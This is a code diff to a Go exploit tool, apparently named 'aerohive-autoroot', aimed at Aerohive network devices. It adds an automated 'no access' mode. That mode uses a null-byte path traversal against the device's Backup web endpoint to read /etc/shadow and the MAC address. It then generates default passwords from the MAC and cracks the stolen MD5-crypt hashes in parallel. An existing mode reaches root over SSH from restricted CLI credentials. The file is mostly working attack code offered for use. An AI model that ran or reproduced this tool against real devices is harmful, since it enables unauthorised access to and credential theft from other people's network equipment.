@@ -1,7 +1,9 @@
 package main
 
 import (
+	"aerohive-autoroot/pkg/md5crypt"
 	"bufio"
+	"bytes"
 	"crypto/tls"
 	"flag"
 	"fmt"
@@ -14,6 +16,7 @@ import (
 	"path/filepath"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
 
 	"golang.org/x/crypto/ssh"
@@ -24,6 +27,8 @@ func check(err error) {
 		log.Fatal(err)
 	}
 }
+
+var Address string
 
 func printHelp() {
 	fmt.Println("usage: ", filepath.Base(os.Args[0]), "[options] <device ip>")
@@ -41,7 +46,7 @@ func printHelp() {
 	fmt.Println("\t\t--readfile <path>\tPath to file to read off the server and print it to STDOUT (disables automatic cracking)")
 	fmt.Printf("\n")
 
-	fmt.Println("\tRestricted CLI options")
+	fmt.Println("\tRestricted CLI Access Options")
 	fmt.Println("\t\t-u\tCommand line interface username")
 	fmt.Println("\t\t-p\tCommand line interface password")
 	fmt.Println("\t\t--pubkey <path>\tPath to public key to write to device")
@@ -80,7 +85,9 @@ func main() {
 	})
 
 	if generateOnly {
-		for _, v := range generatePasswords(*mac) {
+		pwds, err := generatePasswords(*mac)
+		check(err)
+		for _, v := range pwds {
 			fmt.Println(v)
 		}
 		return
@@ -92,17 +99,10 @@ func main() {
 		return
 	}
 
+	Address = flag.Args()[0]
+
 	if hasCliAccess && (generateOnly || readOnly) {
 		log.Fatal("Incompatiable flags")
-	}
-
-	if hasCliAccess {
-		if len(*path) == 0 {
-			log.Fatal("A public key needs to be specified for this mode (--pubkey path)")
-		}
-
-		restrictedShellRoot(*path, *username, *password)
-		return
 	}
 
 	if readOnly {
@@ -118,6 +118,92 @@ func main() {
 		return
 	}
 
+	if hasCliAccess {
+		if len(*path) == 0 {
+			log.Fatal("A public key needs to be specified for this mode (--pubkey path)")
+		}
+
+		restrictedShellRoot(*path, *username, *password)
+		return
+	}
+
+	noAccess(*webport)
+}
+
+func noAccess(port int) {
+	log.Println("Attempting read file exploit....")
+	lines, err := readPath("/etc/shadow", port)
+	if err != nil {
+		log.Fatalln("Error: ", err)
+	}
+
+	type hash struct {
+		User string
+		Hash []byte
+	}
+
+	hashes := []hash{}
+	for _, v := range lines {
+		if strings.Contains(v, "Aerohive") {
+			parts := strings.Split(v, ":")
+			if len(parts) > 2 {
+				fmt.Println("Hash: ", v)
+				hashes = append(hashes, hash{parts[0], []byte(parts[1])})
+			} else {
+				log.Println("Skipping entry: ", v, " as it hasnt split right")
+			}
+		}
+	}
+	if len(hashes) == 0 {
+		log.Fatal("No default accounts found in shadow file, failed")
+	}
+
+	lines, err = readPath("/f/system_info/hw_info", port)
+	if err != nil {
+		log.Fatalln("Unable to automatically deterimine mac address")
+	}
+
+	var mac string
+	for _, v := range lines {
+		if strings.Contains(v, "MAC address") {
+
+			mac = strings.TrimSpace(v[strings.Index(v, ":")+1:])
+			break
+		}
+	}
+
+	mac = mac[:2] + ":" + mac[2:7] + ":" + mac[7:9] + mac[9:12] + ":" + mac[12:]
+	fmt.Println("Got mac address as: ", mac)
+	fmt.Printf("Generating passwords...")
+	passwords, err := generatePasswords(mac)
+	check(err)
+	fmt.Printf("Done\n")
+
+	var wg sync.WaitGroup
+	for i := 0; i < 10; i++ {
+		list := make([]string, len(passwords)/10)
+		for ii := i; ii < len(passwords); ii += 10 {
+			list = append(list, passwords[ii])
+		}
+		wg.Add(1)
+		go func(pwdList []string) {
+			for _, v := range pwdList {
+				hash := md5crypt.MD5Crypt([]byte(v), []byte(""), []byte("$1$"))
+				for _, h := range hashes {
+					if bytes.Equal(hash, h.Hash) {
+						log.Printf("Found match. Username: %s, Hash: %s, Password: %s\n", h.User, h.Hash, v)
+					}
+				}
+			}
+			wg.Done()
+		}(list)
+
+		fmt.Println("Started thread: ", i)
+	}
+
+	wg.Wait()
+	log.Println("Finished")
+
 }
 
 func readPath(path string, port int) (s []string, err error) {
@@ -129,7 +215,7 @@ func readPath(path string, port int) (s []string, err error) {
 
 	data := strings.NewReader("mac=../../.." + path + "%00")
 
-	resp, err := client.Post("https://"+flag.Args()[0]+":"+strconv.Itoa(port)+"/action.php5?_page=Backup&_action=get&name=bloop&debug=true", "application/x-www-form-urlencoded", data)
+	resp, err := client.Post("https://"+Address+":"+strconv.Itoa(port)+"/action.php5?_page=Backup&_action=get&name=bloop&debug=true", "application/x-www-form-urlencoded", data)
 	if err != nil {
 		fmt.Println(err)
 		return s, err
@@ -152,10 +238,10 @@ func readPath(path string, port int) (s []string, err error) {
 
 }
 
-func generatePasswords(mac string) (s []string) {
+func generatePasswords(mac string) (s []string, err error) {
 	hwadd, err := net.ParseMAC(mac)
 	if err != nil {
-		log.Fatal("Invalid mac address: ", err)
+		return s, err
 	}
 
 	last := strings.ReplaceAll(hwadd.String(), ":", "")[6:]
@@ -166,7 +252,7 @@ func generatePasswords(mac string) (s []string) {
 		s = append(s, prefix+strconv.Itoa(i))
 	}
 
-	return s
+	return s, nil
 }
 
 func restrictedShellRoot(pubkey, username, password string) {
@@ -184,7 +270,7 @@ func restrictedShellRoot(pubkey, username, password string) {
 			return nil
 		},
 	}
-	client, err := ssh.Dial("tcp", flag.Args()[0], config)
+	client, err := ssh.Dial("tcp", Address, config)
 	if err != nil {
 		log.Fatal("Failed to dial: ", err)
 	}
